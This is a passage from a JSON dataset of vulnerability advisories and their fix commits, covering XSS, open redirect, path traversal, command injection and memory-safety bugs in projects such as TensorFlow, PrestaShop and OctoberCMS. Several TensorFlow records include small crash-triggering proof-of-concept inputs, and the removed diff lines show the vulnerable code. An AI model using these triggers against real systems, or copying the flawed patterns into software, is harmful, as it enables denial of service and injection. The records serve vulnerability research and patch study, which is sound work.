v4.3.0\n\n### References\n[Cross-site Scripting (XSS) - Stored (CWE-79)](https:\/\/cwe.mitre.org\/data\/definitions\/79.html)","published_date":"2020-09-15","chain_len":1,"project":"https:\/\/github.com\/PrestaShop\/contactform","commit_href":"https:\/\/github.com\/PrestaShop\/contactform\/commit\/ecd9f5d14920ec00885766a7cb41bcc5ed8bfa09","commit_sha":"ecd9f5d14920ec00885766a7cb41bcc5ed8bfa09","patch":"SINGLE","chain_ord":"['ecd9f5d14920ec00885766a7cb41bcc5ed8bfa09']","before_first_fix_commit":"{'a883e56240357b4aaaf594ade573bb596e518078', 'aa3c77923734854bb7168f30db43544e42638202'}","last_fix_commit":"ecd9f5d14920ec00885766a7cb41bcc5ed8bfa09","chain_ord_pos":1.0,"commit_datetime":"09\/15\/2020, 08:03:00","message":"Merge pull request from GHSA-95hx-62rh-gg96\n\nDo not unescape form message data","author":"GoT","comments":null,"stats":"{'additions': 9, 'deletions': 8, 'total': 17}","files":"{'contactform.php': {'additions': 9, 'deletions': 8, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/PrestaShop\/contactform\/raw\/ecd9f5d14920ec00885766a7cb41bcc5ed8bfa09\/contactform.php', 'patch': \"@@ -317,7 +317,7 @@ public function getWidgetVariables($hookName = null, array $configuration = [])\\n             }\\n         }\\n         $this->contact['contacts'] = $this->getTemplateVarContact();\\n-        $this->contact['message'] = html_entity_decode(Tools::getValue('message'));\\n+        $this->contact['message'] = Tools::getValue('message');\\n         $this->contact['allow_file_upload'] = (bool) Configuration::get('PS_CUSTOMER_SERVICE_FILE_UPLOAD');\\n \\n         if (!(bool)Configuration::isCatalogMode()) {\\n@@ -388,9 +388,10 @@ public function getTemplateVarOrders()\\n     {\\n         $orders = [];\\n \\n-        if (!isset($this->customer_thread['id_order'])\\n+        if (empty($this->customer_thread['id_order'])\\n             && isset($this->context->customer)\\n-            && $this->context->customer->isLogged()) {\\n+            && $this->context->customer->isLogged()\\n+        ) {\\n             $customer_orders = Order::getCustomerOrders($this->context->customer->id);\\n \\n             foreach ($customer_orders as $customer_order) {\\n@@ -401,7 +402,7 @@ public function getTemplateVarOrders()\\n                     $orders[$customer_order['id_order']]['products'] = $myOrder->getProducts();\\n                 }\\n             }\\n-        } elseif (isset($this->customer_thread['id_order']) && (int)$this->customer_thread['id_order'] > 0) {\\n+        } elseif (isset($this->customer_thread['id_order']) && (int) $this->customer_thread['id_order'] > 0) {\\n             $myOrder = new Order($this->customer_thread['id_order']);\\n \\n             if (Validate::isLoadedObject($myOrder)) {\\n@@ -411,13 +412,13 @@ public function getTemplateVarOrders()\\n             }\\n         }\\n \\n-        if (isset($this->customer_thread['id_product'])) {\\n+        if (!empty($this->customer_thread['id_product'])) {\\n             $id_order = isset($this->customer_thread['id_order']) ?\\n-                      (int)$this->customer_thread['id_order'] :\\n+                      (int) $this->customer_thread['id_order'] :\\n                       0;\\n \\n             $orders[$id_order]['products'][(int)$this->customer_thread['id_product']] = $this->context->controller->objectPresenter->present(\\n-                new Product((int)$this->customer_thread['id_product'])\\n+                new Product((int) $this->customer_thread['id_product'])\\n             );\\n         }\\n \\n@@ -586,7 +587,7 @@ public function sendMessage()\\n                     '{lastname}' => '',\\n                     '{order_name}' => '-',\\n                     '{attached_file}' => '-',\\n-                    '{message}' => Tools::nl2br(Tools::stripslashes($message)),\\n+                    '{message}' => Tools::nl2br(Tools::htmlentitiesUTF8(Tools::stripslashes($message))),\\n                     '{email}' =>  $from,\\n                     '{product_name}' => '',\\n                 ];\"}}","message_norm":"merge pull request from ghsa-95hx-62rh-gg96\n\ndo not unescape form message data","language":"fr","entities":"[('ghsa-95hx-62rh-gg96', 'VULNID', 'GHSA'), ('unescape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['contactform.php'])","num_files":1.0},{"index":1322,"vuln_id":"GHSA-95xm-g58g-3p88","cwe_id":"{'CWE-369'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4923de56ec94fff7770df259ab7f2288a74feb41'}","dataset":"osv","summary":"Integer division by 0 in sparse reshaping ### Impact\nThe implementation of `tf.raw_ops.SparseReshape` can be made to trigger an integral division by 0 exception:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SparseReshape(\n  input_indices = np.ones((1,3)),\n  input_shape = np.array([1,1,0]),\n  new_shape = np.array([1,0]))\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/reshape_util.cc#L176-L181) calls the reshaping functor whenever there is at least an index in the input but does not check that shape of the input or the target shape have both a non-zero number of elements.\n\nThe [reshape functor](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/reshape_util.cc#L40-L78) blindly divides by the dimensions of the target shape. Hence, if this is not checked, code will result in a division by 0.\n  \n### Patches\nWe have patched the issue in GitHub commit [4923de56ec94fff7770df259ab7f2288a74feb41](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4923de56ec94fff7770df259ab7f2288a74feb41).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1 as this is the other affected version.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4923de56ec94fff7770df259ab7f2288a74feb41","commit_sha":"4923de56ec94fff7770df259ab7f2288a74feb41","patch":"SINGLE","chain_ord":"['4923de56ec94fff7770df259ab7f2288a74feb41']","before_first_fix_commit":"{'062534a0e7af9a49e96bc5797851be0e57cad1d6'}","last_fix_commit":"4923de56ec94fff7770df259ab7f2288a74feb41","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2021, 20:52:28","message":"Don't do any work when reshaping 0 elements sparse tensor.\n\nIf reshaping to 0 elements tensor, check that input has no elements.\nIf reshaping no elements input, check that output has no elements.\n\nPiperOrigin-RevId: 388296986\nChange-Id: Iadc9fe7252e14313ca987e69bf0d7042fd10232a","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/reshape_util.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4923de56ec94fff7770df259ab7f2288a74feb41\/tensorflow%2Fcore%2Fkernels%2Freshape_util.cc', 'patch': '@@ -174,6 +174,12 @@ void ReshapeSparseTensor(OpKernelContext *context,\\n                                           TensorShape({nnz, output_rank}),\\n                                           &result_indices));\\n   if (nnz > 0) {\\n+    OP_REQUIRES(\\n+        context, dense_size > 0 && product > 0,\\n+        errors::InvalidArgument(\\n+            \"Input tensor has \", nnz, \" non zero elements but input shape (\",\\n+            input_shape.DebugString(), \") or output shape (\",\\n+            output_shape.DebugString(), \") is empty\"));\\n     OP_REQUIRES_OK(context, functor::ReshapeSparseTensorFunctor<Device>()(\\n                                 context, input_shape, output_shape,\\n                                 input_indices_in.matrix<int64>(),'}}","message_norm":"don't do any work when reshaping 0 elements sparse tensor.\n\nif reshaping to 0 elements tensor, check that input has no elements.\nif reshaping no elements input, check that output has no elements.\n\npiperorigin-revid: 388296986\nchange-id: iadc9fe7252e14313ca987e69bf0d7042fd10232a","language":"en","entities":"[('388296986', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/reshape_util.cc'])","num_files":1.0},{"index":1325,"vuln_id":"GHSA-9689-rx4v-cqgc","cwe_id":"{'CWE-601'}","score":5.4,"chain":"{'https:\/\/github.com\/concourse\/concourse\/pull\/5350\/commits\/38cb4cc025e5ed28764b4adc363a0bbf41f3c7cb'}","dataset":"osv","summary":"Open Redirect Pivotal Concourse Release, versions 4.x prior to 4.2.2, login flow allows redirects to untrusted websites. A remote unauthenticated attacker could convince a user to click on a link using the oAuth redirect link with an untrusted website and gain access to that user's access token in Concourse.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/concourse\/concourse","commit_href":"https:\/\/github.com\/concourse\/concourse\/pull\/5350\/commits\/38cb4cc025e5ed28764b4adc363a0bbf41f3c7cb","commit_sha":"38cb4cc025e5ed28764b4adc363a0bbf41f3c7cb","patch":"SINGLE","chain_ord":"['38cb4cc025e5ed28764b4adc363a0bbf41f3c7cb']","before_first_fix_commit":"{'091671e19b3779e439f5ad4a6b4b89aa20a33778'}","last_fix_commit":"38cb4cc025e5ed28764b4adc363a0bbf41f3c7cb","chain_ord_pos":1.0,"commit_datetime":"03\/20\/2020, 16:32:09","message":"skymarshal: use escaped path for redirect URI\n\nSigned-off-by: Rui Yang <ryang@pivotal.io>","author":"Rui Yang","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'skymarshal\/skyserver\/skyserver.go': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/concourse\/concourse\/raw\/38cb4cc025e5ed28764b4adc363a0bbf41f3c7cb\/skymarshal%2Fskyserver%2Fskyserver.go', 'patch': '@@ -257,7 +257,7 @@ func (s *SkyServer) Redirect(w http.ResponseWriter, r *http.Request, token *oaut\\n \\tparams := redirectURL.Query()\\n \\tparams.Set(\"csrf_token\", csrfToken)\\n \\n-\\thttp.Redirect(w, r, redirectURL.Path+\"?\"+params.Encode(), http.StatusTemporaryRedirect)\\n+\\thttp.Redirect(w, r, redirectURL.EscapedPath()+\"?\"+params.Encode(), http.StatusTemporaryRedirect)\\n }\\n \\n func (s *SkyServer) Token(w http.ResponseWriter, r *http.Request) {'}}","message_norm":"skymarshal: use escaped path for redirect uri\n\nsigned-off-by: rui yang <ryang@pivotal.io>","language":"en","entities":"[('escaped', 'SECWORD', ''), ('ryang@pivotal.io', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['skymarshal\/skyserver\/skyserver.go'])","num_files":1.0},{"index":1327,"vuln_id":"GHSA-9697-98pf-4rw7","cwe_id":"{'CWE-125'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/42459e4273c2e47a3232cc16c4f4fff3b3a35c38'}","dataset":"osv","summary":"Heap OOB in `UpperBound` and `LowerBound` ### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.UpperBound`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.UpperBound(\n  sorted_input=[1,2,3],\n  values=tf.constant(value=[[0,0,0],[1,1,1],[2,2,2]],dtype=tf.int64),\n  out_type=tf.int64)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/searchsorted_op.cc#L85-L104) does not validate the rank of `sorted_input` argument:\n\n```cc\n  void Compute(OpKernelContext* ctx) override {\n    const Tensor& sorted_inputs_t = ctx->input(0);\n    \/\/ ...\n    OP_REQUIRES(ctx, sorted_inputs_t.dim_size(0) == values_t.dim_size(0),\n                Status(error::INVALID_ARGUMENT,\n                       \"Leading dim_size of both tensors must match.\"));\n    \/\/ ...\n    if (output_t->dtype() == DT_INT32) {\n      OP_REQUIRES(ctx,\n                  FastBoundsCheck(sorted_inputs_t.dim_size(1), ...));\n      \/\/ ...\n    }\n```\n\nAs we access the first two dimensions of `sorted_inputs_t` tensor, it must have rank at least 2.\n\nA similar issue occurs in `tf.raw_ops.LowerBound`.\n\n### Patches\nWe have patched the issue in GitHub commit [42459e4273c2e47a3232cc16c4f4fff3b3a35c38](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/42459e4273c2e47a3232cc16c4f4fff3b3a35c38).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/42459e4273c2e47a3232cc16c4f4fff3b3a35c38","commit_sha":"42459e4273c2e47a3232cc16c4f4fff3b3a35c38","patch":"SINGLE","chain_ord":"['42459e4273c2e47a3232cc16c4f4fff3b3a35c38']","before_first_fix_commit":"{'b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58'}","last_fix_commit":"42459e4273c2e47a3232cc16c4f4fff3b3a35c38","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 05:25:05","message":"Prevent CHECK-fail\/heap OOB in UpperBound and LowerBound\n\nPiperOrigin-RevId: 387738073\nChange-Id: Iee74de95ddad18440d052a75a5a1cb67544f490a","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'tensorflow\/core\/kernels\/searchsorted_op.cc': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/42459e4273c2e47a3232cc16c4f4fff3b3a35c38\/tensorflow%2Fcore%2Fkernels%2Fsearchsorted_op.cc', 'patch': '@@ -86,6 +86,10 @@ class UpperBoundOp : public OpKernel {\\n     const Tensor& sorted_inputs_t = ctx->input(0);\\n     const Tensor& values_t = ctx->input(1);\\n \\n+    \/\/ inputs must be at least a matrix\\n+    OP_REQUIRES(\\n+        ctx, sorted_inputs_t.shape().dims() >= 2,\\n+        errors::InvalidArgument(\"sorted input argument must be a matrix\"));\\n     \/\/ must have same batch dim_size for both\\n     OP_REQUIRES(ctx, sorted_inputs_t.dim_size(0) == values_t.dim_size(0),\\n                 Status(error::INVALID_ARGUMENT,\\n@@ -127,6 +131,10 @@ class LowerBoundOp : public OpKernel {\\n     const Tensor& sorted_inputs_t = ctx->input(0);\\n     const Tensor& values_t = ctx->input(1);\\n \\n+    \/\/ inputs must be at least a matrix\\n+    OP_REQUIRES(\\n+        ctx, sorted_inputs_t.shape().dims() >= 2,\\n+        errors::InvalidArgument(\"sorted input argument must be a matrix\"));\\n     \/\/ must have same batch dim_size for both\\n     OP_REQUIRES(ctx, sorted_inputs_t.dim_size(0) == values_t.dim_size(0),\\n                 Status(error::INVALID_ARGUMENT,'}}","message_norm":"prevent check-fail\/heap oob in upperbound and lowerbound\n\npiperorigin-revid: 387738073\nchange-id: iee74de95ddad18440d052a75a5a1cb67544f490a","language":"en","entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('387738073', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/searchsorted_op.cc'])","num_files":1.0},{"index":1328,"vuln_id":"GHSA-9722-rr68-rfpg","cwe_id":"{'CWE-610', 'CWE-73'}","score":3.4,"chain":"{'https:\/\/github.com\/octobercms\/october\/commit\/6711dae8ef70caf0e94cec434498012a2ccd86b8'}","dataset":"osv","summary":"Upload whitelisted files to any directory in OctoberCMS ### Impact\nAn attacker can exploit this vulnerability to upload jpg, jpeg, bmp, png, webp, gif, ico, css, js, woff, woff2, svg, ttf, eot, json, md, less, sass, scss, xml files to any directory of an October CMS server. The vulnerability is only exploitable by an authenticated backend user with the `cms.manage_assets` permission.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https:\/\/github.com\/octobercms\/october\/commit\/6711dae8ef70caf0e94cec434498012a2ccd86b8 to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by [Sivanesh Ashok](https:\/\/stazot.com\/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1241\" alt=\"Screen Shot 2020-03-31 at 12 21 10 PM\" src=\"https:\/\/user-images.githubusercontent.com\/7253840\/78061230-255f5400-734a-11ea-92b4-1120f6960505.png\">","published_date":"2020-06-03","chain_len":1,"project":"https:\/\/github.com\/octobercms\/october","commit_href":"https:\/\/github.com\/octobercms\/october\/commit\/6711dae8ef70caf0e94cec434498012a2ccd86b8","commit_sha":"6711dae8ef70caf0e94cec434498012a2ccd86b8","patch":"SINGLE","chain_ord":"['6711dae8ef70caf0e94cec434498012a2ccd86b8']","before_first_fix_commit":"{'2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc'}","last_fix_commit":"6711dae8ef70caf0e94cec434498012a2ccd86b8","chain_ord_pos":1.0,"commit_datetime":"03\/31\/2020, 10:09:18","message":"Improve asset file path handling when moving assets","author":"Luke Towers","comments":null,"stats":"{'additions': 8, 'deletions': 1, 'total': 9}","files":"{'modules\/cms\/widgets\/AssetList.php': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/octobercms\/october\/raw\/6711dae8ef70caf0e94cec434498012a2ccd86b8\/modules%2Fcms%2Fwidgets%2FAssetList.php', 'patch': \"@@ -333,13 +333,20 @@ public function onMove()\\n \\n             $basename = basename($path);\\n             $originalFullPath = $this->getFullPath($path);\\n-            $newFullPath = rtrim($destinationFullPath, '\/').'\/'.$basename;\\n+            $newFullPath = realpath(rtrim($destinationFullPath, '\/')) . '\/' . $basename;\\n             $safeDir = $this->getAssetsPath();\\n \\n             if ($originalFullPath == $newFullPath) {\\n                 continue;\\n             }\\n \\n+            if (!starts_with($newFullPath, $safeDir)) {\\n+                throw new ApplicationException(Lang::get(\\n+                    'cms::lang.asset.error_moving_file',\\n+                    ['file' => $basename]\\n+                ));\\n+            }\\n+\\n             if (is_file($originalFullPath)) {\\n                 if (!@File::move($originalFullPath, $newFullPath)) {\\n                     throw new ApplicationException(Lang::get(\"}}","message_norm":"improve asset file path handling when moving assets","language":"en","entities":"[('improve', 'ACTION', ''), ('asset', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/cms\/widgets\/AssetList.php'])","num_files":1.0},{"index":1331,"vuln_id":"GHSA-976r-qfjj-c24w","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/apache\/airflow\/commit\/afa4b11fddfdbadb048f742cf66d5c21c675a5c8'}","dataset":"osv","summary":"Command injection via Celery broker in Apache Airflow An issue was found in Apache Airflow versions 1.10.10 and below. When using CeleryExecutor, if an attacker can connect to the broker (Redis, RabbitMQ) directly, it is possible to inject commands, resulting in the celery worker running arbitrary commands.","published_date":"2020-07-27","chain_len":1,"project":"https:\/\/github.com\/apache\/airflow","commit_href":"https:\/\/github.com\/apache\/airflow\/commit\/afa4b11fddfdbadb048f742cf66d5c21c675a5c8","commit_sha":"afa4b11fddfdbadb048f742cf66d5c21c675a5c8","patch":"SINGLE","chain_ord":"['afa4b11fddfdbadb048f742cf66d5c21c675a5c8']","before_first_fix_commit":"{'63260c9955d12a60d8c143a932432013dd05eebb'}","last_fix_commit":"afa4b11fddfdbadb048f742cf66d5c21c675a5c8","chain_ord_pos":1.0,"commit_datetime":"12\/27\/2019, 08:24:41","message":"[AIRFLOW-6351] security - ui - Add Cross Site Scripting defence (#6913)","author":"tooptoop4","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'airflow\/www_rbac\/views.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/airflow\/raw\/afa4b11fddfdbadb048f742cf66d5c21c675a5c8\/airflow%2Fwww_rbac%2Fviews.py', 'patch': '@@ -321,7 +321,7 @@ def get_int_arg(value, default=0):\\n             num_dag_to=min(end, num_of_all_dags),\\n             num_of_all_dags=num_of_all_dags,\\n             paging=wwwutils.generate_pages(current_page, num_of_pages,\\n-                                           search=arg_search_query,\\n+                                           search=escape(arg_search_query) if arg_search_query else None,\\n                                            showPaused=not hide_paused),\\n             num_runs=num_runs,\\n             tags=tags)'}}","message_norm":"[airflow-6351] security - ui - add cross site scripting defence (#6913)","language":"en","entities":"[('security', 'SECWORD', ''), ('add', 'ACTION', ''), ('cross site scripting', 'SECWORD', ''), ('defence', 'SECWORD', ''), ('#6913', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['airflow\/www_rbac\/views.py'])","num_files":1.0},{"index":1334,"vuln_id":"GHSA-97gv-3p2c-xw7j","cwe_id":"{'CWE-74', 'CWE-400'}","score":8.2,"chain":"{'https:\/\/github.com\/oliversalzburg\/i18n-node-angular\/commit\/877720d2d9bb90dc8233706e81ffa03f99fc9dc8'}","dataset":"osv","summary":"Denial of Service and Content Injection in i18n-node-angular Versions of `i18n-node-angular` prior to 1.4.0 are affected by denial of service and cross-site scripting vulnerabilities. The vulnerabilities exist in a REST endpoint that was created for development purposes, but was not disabled in production in affected versions.\n\n\n## Recommendation\n\nUpdate to version 1.4.0 or later.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/oliversalzburg\/i18n-node-angular","commit_href":"https:\/\/github.com\/oliversalzburg\/i18n-node-angular\/commit\/877720d2d9bb90dc8233706e81ffa03f99fc9dc8","commit_sha":"877720d2d9bb90dc8233706e81ffa03f99fc9dc8","patch":"SINGLE","chain_ord":"['877720d2d9bb90dc8233706e81ffa03f99fc9dc8']","before_first_fix_commit":"{'85ba51ac9dc47a3e232a19926791219ef9de20ee'}","last_fix_commit":"877720d2d9bb90dc8233706e81ffa03f99fc9dc8","chain_ord_pos":1.0,"commit_datetime":"01\/07\/2016, 08:40:02","message":"[FIX] Only register translate route during development","author":"Oliver Salzburg","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'i18n-node-routes.js': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/oliversalzburg\/i18n-node-angular\/raw\/877720d2d9bb90dc8233706e81ffa03f99fc9dc8\/i18n-node-routes.js', 'patch': '@@ -49,7 +49,10 @@ var configure = function( app, configObject ) {\\n \\n \\t\/\/ Register routes\\n \\tapp.get( \"\/i18n\/:locale\", i18nRoutes.i18n );\\n-\\tapp.get( \"\/i18n\/:locale\/:phrase\", i18nRoutes.translate );\\n+\\n+\\tif( process.env.NODE_ENV === \"development\" ) {\\n+\\t\\tapp.get( \"\/i18n\/:locale\/:phrase\", i18nRoutes.translate );\\n+\\t}\\n };\\n \\n \/**'}}","message_norm":"[fix] only register translate route during development","language":"en","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['i18n-node-routes.js'])","num_files":1.0},{"index":1336,"vuln_id":"GHSA-97wf-p777-86jq","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of Split ### Impact\nThe implementation of the `Split` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e2752089ef7ce9bcf3db0ec618ebd23ea119d0c7\/tensorflow\/lite\/kernels\/split.cc#L63-L65):\n\n```cc\nTF_LITE_ENSURE_MSG(context, input_size % num_splits == 0, \"Not an even split\");\nconst int slice_size = input_size \/ num_splits;\n```\n\nAn attacker can craft a model such that `num_splits` would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d","commit_sha":"b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d","patch":"SINGLE","chain_ord":"['b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d']","before_first_fix_commit":"{'e2752089ef7ce9bcf3db0ec618ebd23ea119d0c7'}","last_fix_commit":"b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 22:31:26","message":"Prevent division by 0\n\nPiperOrigin-RevId: 370998952\nChange-Id: I6b1d49079624ee1447d2d9b53a8976fb356cc8f5","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/split.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d\/tensorflow%2Flite%2Fkernels%2Fsplit.cc', 'patch': '@@ -60,6 +60,7 @@ TfLiteStatus ResizeOutputTensors(TfLiteContext* context, TfLiteNode* node,\\n   TF_LITE_ENSURE(context, axis_value < NumDimensions(input));\\n \\n   const int input_size = SizeOfDimension(input, axis_value);\\n+  TF_LITE_ENSURE(context, num_splits != 0);\\n   TF_LITE_ENSURE_MSG(context, input_size % num_splits == 0,\\n                      \"Not an even split\");\\n   const int slice_size = input_size \/ num_splits;'}}","message_norm":"prevent division by 0\n\npiperorigin-revid: 370998952\nchange-id: i6b1d49079624ee1447d2d9b53a8976fb356cc8f5","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370998952', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/split.cc'])","num_files":1.0},{"index":1339,"vuln_id":"GHSA-98gj-wwxm-cj3h","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/lepture\/mistune\/commit\/5f06d724bc05580e7f203db2d4a4905fc1127f98'}","dataset":"osv","summary":"Moderate severity vulnerability that affects mistune Cross-site scripting (XSS) vulnerability in the _keyify function in mistune.py in Mistune before 0.8.1 allows remote attackers to inject arbitrary web script or HTML by leveraging failure to escape the \"key\" argument.","published_date":"2019-01-04","chain_len":1,"project":"https:\/\/github.com\/lepture\/mistune","commit_href":"https:\/\/github.com\/lepture\/mistune\/commit\/5f06d724bc05580e7f203db2d4a4905fc1127f98","commit_sha":"5f06d724bc05580e7f203db2d4a4905fc1127f98","patch":"SINGLE","chain_ord":"['5f06d724bc05580e7f203db2d4a4905fc1127f98']","before_first_fix_commit":"{'7f7f106a717e6cf58012304e56b41d6fb2b98e5f'}","last_fix_commit":"5f06d724bc05580e7f203db2d4a4905fc1127f98","chain_ord_pos":1.0,"commit_datetime":"11\/20\/2017, 15:15:09","message":"Fix CVE-2017-16876","author":"Hsiaoming Yang","comments":null,"stats":"{'additions': 5, 'deletions': 3, 'total': 8}","files":"{'mistune.py': {'additions': 5, 'deletions': 3, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/lepture\/mistune\/raw\/5f06d724bc05580e7f203db2d4a4905fc1127f98\/mistune.py', 'patch': \"@@ -11,7 +11,7 @@\\n import re\\n import inspect\\n \\n-__version__ = '0.8'\\n+__version__ = '0.8.1'\\n __author__ = 'Hsiaoming Yang <me@lepture.com>'\\n __all__ = [\\n     'BlockGrammar', 'BlockLexer',\\n@@ -48,7 +48,8 @@ def _pure_pattern(regex):\\n \\n \\n def _keyify(key):\\n-    return _key_pattern.sub(' ', key.lower())\\n+    key = escape(key.lower(), quote=True)\\n+    return _key_pattern.sub(' ', key)\\n \\n \\n def escape(text, quote=False, smart_amp=True):\\n@@ -445,7 +446,8 @@ class InlineGrammar(object):\\n     inline_html = re.compile(\\n         r'^(?:%s|%s|%s)' % (\\n             r'<!--[\\\\s\\\\S]*?-->',\\n-            r'<(\\\\w+%s)((?:%s)*?)\\\\s*>([\\\\s\\\\S]*?)<\\\\\/\\\\1>' % (_valid_end, _valid_attr),\\n+            r'<(\\\\w+%s)((?:%s)*?)\\\\s*>([\\\\s\\\\S]*?)<\\\\\/\\\\1>' % (\\n+                _valid_end, _valid_attr),\\n             r'<\\\\w+%s(?:%s)*?\\\\s*\\\\\/?>' % (_valid_end, _valid_attr),\\n         )\\n     )\"}}","message_norm":"fix cve-2017-16876","language":"fr","entities":"[('fix', 'ACTION', ''), ('cve-2017-16876', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['mistune.py'])","num_files":1.0},{"index":1343,"vuln_id":"GHSA-98p5-x8x4-c9m5","cwe_id":"{'CWE-190'}","score":8.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f19be71717c497723ba0cea0379e84f061a75e01', 